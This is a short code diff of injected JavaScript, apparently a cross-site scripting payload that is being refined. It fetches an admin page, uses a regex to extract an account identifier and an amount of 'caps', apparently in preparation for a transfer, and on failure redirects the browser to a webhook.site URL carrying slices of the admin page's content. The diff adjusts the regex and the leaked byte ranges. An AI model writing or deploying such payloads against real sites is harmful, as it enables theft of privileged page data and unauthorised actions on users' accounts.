@@ -1,7 +1,7 @@
 fetch('/radrovers/admin').then(r=>r.text()).then(t=>{
-  var m = t.match(/<option value="([A-Z]{2}-\d{4}-\d{4}-\d{4})">[^<]*\((\d+) caps\)/);
+  var m = t.match(/<option value="([A-Z]{2}-\d{4}-\d{4}-\d{4})">[^<]*\((\d+) [Cc]\w+\)/);
   if(!m){
-    window.location.href='https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3nomatch?snip='+encodeURIComponent(t.slice(3500,4500));
+    window.location.href='https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3nomatchb?snip='+encodeURIComponent(t.slice(4500,5500));
     return;
   }
   var from=m[1], amt=m[2];
